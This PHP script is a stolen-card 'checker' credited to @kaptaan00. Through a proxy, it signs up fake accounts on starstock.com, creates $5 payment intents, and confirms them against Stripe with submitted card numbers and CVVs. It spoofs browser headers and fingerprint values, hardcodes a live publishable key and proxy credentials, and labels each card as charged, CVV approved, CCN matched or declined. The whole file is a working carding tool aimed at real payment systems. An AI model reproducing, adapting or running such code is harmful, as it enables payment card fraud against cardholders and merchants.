<?php 
//////////////////////
//////////////

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]


$invoice = rand(000000,999999);
$name = ucfirst(str_shuffle('Kaptaan'));
$last = ucfirst(str_shuffle('saab'));
$first1 = str_shuffle("kaptaan0085246");
$serve_arr = array("gmail.com","hotmail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$first1."%40".$serv_rnd."";

$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$state = "New+York";
$zip = "10080";
$city = "New+York";
$street = "Street 76";
}
elseif ($state == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
$street = "Street 56";
}
elseif ($state == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
$street = "Street 70";
}
elseif ($state == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange+Park";
$street = "Street 64";
}
else{
$state = "California";
$zip = "90201";
$city = "Bell";
$street = "Street 46";
};



/*switch ($ano) {
  case '2031':
  $ano = '31';
  break;
  case '2030':
  $ano = '30';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
  case '2027':
  $ano = '27';
    break;
  case '2028':
  $ano = '28';
  break;
  case '2029':
  $ano = '29';
  break;
}
*/





/////////
$proxy = 'http://us.proxiware.com:2000';
$username = 'rahul';
$password = 'rahul';


$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://ca.proxiware.com:22000");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/json');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$data = curl_exec($ch);
echo $data;


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://ca.proxiware.com:22000');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/json');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$dat = curl_exec($ch);
echo $dat;

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://ca.proxiware.com:22000');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'https://api.starstock.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.starstock.com';
$headers[] = 'sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"';
$headers[] = 'accept: */*';
$headers[] = 'content-type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://www.starstock.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.starstock.com/';
//$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"accountRegister","variables":{"firstName":"'.$name.'","lastName":"'.$last.'","email":"'.$name.'66543@gmail.com","username":"'.$name.'12","password":"'.$last.'133aaY","marketingEmails":false},"query":"mutation accountRegister($firstName: String!, $lastName: String!, $email: String!, $username: String!, $password: String!, $marketingEmails: Boolean!, $promoCode: String) {\n  accountRegister(\n    firstName: $firstName\n    lastName: $lastName\n    email: $email\n    username: $username\n    password: $password\n    marketingEmails: $marketingEmails\n    promoCode: $promoCode\n  ) {\n    user {\n      id\n      __typename\n    }\n    refreshToken\n    errors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}"}');
$curl = curl_exec($ch);
 $retoken = GetStr($curl, '"refreshToken":"','"');
/////////////////


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://ca.proxiware.com:22000');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'https://api.starstock.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.starstock.com';
$headers[] = 'sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"';
$headers[] = 'accept: */*';
$headers[] = 'content-type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://www.starstock.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.starstock.com/';
//$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"refreshToken","variables":{"refreshToken":"'.$retoken.'"},"query":"mutation refreshToken($refreshToken: String!) {\n  refreshToken(refreshToken: $refreshToken) {\n    token\n    refreshToken\n    refreshExpiresIn\n    payload\n    __typename\n  }\n}"}');
$curl1 = curl_exec($ch);

///////1st

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://ca.proxiware.com:22000');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'https://api.starstock.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.starstock.com';
$headers[] = 'sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"';
$headers[] = 'accept: */*';
$headers[] = 'content-type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://www.starstock.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.starstock.com/';
//$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"createPaymentIntent","variables":{"amount":500},"query":"mutation createPaymentIntent($amount: Int!, $saveCard: Boolean) {\n  createPaymentIntent(amount: $amount, saveCard: $saveCard) {\n    paymentIntentToken\n    paymentSequence\n    __typename\n  }\n}"}');
//$curl = curl_exec($ch);
 $result = curl_exec($ch);
 $token = GetStr($result, '"paymentIntentToken":"','"');
 $pi = substr($token,0,27); 
 //$tok = trim(strip_tags(getStr($result, '"id": "','"')));

//$firstfour = substr($cc, +4);


/////////Main req

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://ca.proxiware.com:22000');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=0da65dfa-bbaf-4b51-8db2-9557b06d5af98506ef&payment_method_data[muid]=06e2e3fd-e9be-4c63-8d57-bfbc8a07cb1f8b338c&payment_method_data[sid]=bdf1f2e1-76ed-41cc-8b87-9325e13cf88d58fc40&payment_method_data[payment_user_agent]=stripe.js%2Ff2ecd562b%3B+stripe-js-v3%2Ff2ecd562b&payment_method_data[time_on_page]=185786&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_w9vdcanKOlpPDmgXtAg7dRdx00LUytvxLL&client_secret='.$token.'');
$result1 = curl_exec($ch);
$message = trim(strip_tags(getStr($result1,'"message":"','"')));
$dcode = Getstr($result1,'"decline_code": "','",');
$code = Getstr($result1,'"code": "','",');




/////////CARD RESPONSES /////////////
echo $pi;
echo $result1;
echo $result;





if(strpos($result1, 'Thank you for your donation!' )) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}
elseif
(strpos($result1,  '"cvc_check": "pass"')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVV AUTH」</span></br>';
}

elseif
(strpos($result1,  '"type": "stripe_3ds2_fingerprint"')) {
echo '<span class="badge badge-primary">#CCN</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「3DS2 SECURE CARD」</span></br>';
}

elseif
(strpos($result1,  '"status": "succeeded"')) {
echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}

elseif
(strpos($result1,  'Your card has insufficient funds.')) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 Insufficient Funds 」</span></br>';
}

elseif
(strpos($result1,  "Thank You For Donation.")) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}
elseif
(strpos($result1,  '"Thank You For Donation."')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}

elseif
(strpos($result1,  "Thank You.")) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}

elseif
(strpos($result1,  'Your card zip code is incorrect.')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 CVV AUTH 」</span></br>';
} 

elseif
(strpos($result1,  "incorrect_zip")) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVV AVS MISMATCH」</span></br>';
}


elseif
(strpos($result1,  '"type":"one-time"')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVV AVS MISMATCH」</span></br>';
}

elseif(strpos($result, '"generic_decline"' )) {
    echo '<span class="badge badge-danger">Reprovadas</span> - </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> Generic Decline </span></br>';
}
elseif(strpos($result1, "Thank You For Donation." )) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';

}
elseif(strpos($result1, "Thank You." )) {
echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';

}
elseif(strpos($result1,'expired_card')){
    echo '<span class="badge badge-primary">Reprovadas</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「Expired card」</span></br>';

}
elseif(strpos($result1, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 Insufficient Funds 」</span></br>';
}
elseif(strpos($result1, "insufficient_funds")) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 Insufficient Funds 」</span></br>';

}
elseif(strpos($result1, "security code is incorrect" )) {
    echo '<span class="badge badge-primary">#CCN</span> ◈ </span> </span> <span class="badge badge-primary">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 CCN MATCHED 」</span></br>';

}
elseif(strpos($result1, "security code is invalid." )) {

    echo '<span class="badge badge-primary">#CCN</span> ◈ </span> </span> <span class="badge badge-primary">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 CCN MATCHED 」</span></br>';

}

elseif(strpos($result, 'You do not have permission to perform this action' )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 Proxy Dead」</span></br>';
}
elseif(strpos($result1, "incorrect_number" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 Incorrect Card Number」</span></br>';
}
else {
    echo '<span class="badge badge-warning">Reprovadas</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger">「 '.$dcode.' - '.$code.' 」</span></br>';
}

curl_close($ch);
ob_flush();

///////// edited by @kaptaan00

